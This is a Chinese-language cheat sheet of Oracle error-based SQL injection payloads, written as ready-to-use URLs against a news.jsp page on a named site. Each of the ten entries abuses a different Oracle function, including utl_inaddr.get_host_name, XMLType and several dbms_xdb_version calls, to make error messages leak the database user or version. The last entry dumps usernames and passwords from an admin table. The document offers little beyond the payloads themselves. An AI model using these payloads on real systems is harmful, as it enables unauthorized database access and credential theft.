## 1、 utl_inaddr.get_host_name()

```http
http://www.jsporcle.com/news.jsp?id=1 and 1=utl_inaddr.get_host_name((select user from dual))--
```

## 2、 ctxsys.drithsx.sn()

```http
http://www.jsporcle.com/news.jsp?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual))--
```

## 3、 XMLType()

```http
and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --
http://www.jsporcle.com/news.jsp?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select user from dual)%7c%7cchr(62))) from dual) is not null --
```

## 4、dbms_xdb_version.checkin()

```http
http://www.jsporcle.com/news.jsp?id=1 and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null -- 
```

查询版本信息

```http
http://www.jsporcle.com/news.jsp?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null -- 
```

## 5、bms_xdb_version.makeversioned()

```http
http://www.jsporcle.com/news.jsp?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --
```

## 6、dbms_xdb_version.uncheckout()

```http
http://www.jsporcle.com/news.jsp?id=1 and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --
```

## 7、dbms_utility.sqlid_to_sqlhash()

```http
http://www.jsporcle.com/news.jsp?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --
```

## 8、ordsys.ord_dicom.getmappingxpath()

```http
http://www.jsporcle.com/news.jsp?id=1 and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user) --
```

## 9、decode

这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。

```http
http://www.jsporcle.com/news.jsp?id=1 and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual)--
```

## 10、报错admin表的用户和密码

```http
http://www.jsporcle.com/news.jsp?id=1 and 1=utl_inaddr.get_host_name((select (select username%7c%7cpassword from admin)from dual))-- 
```

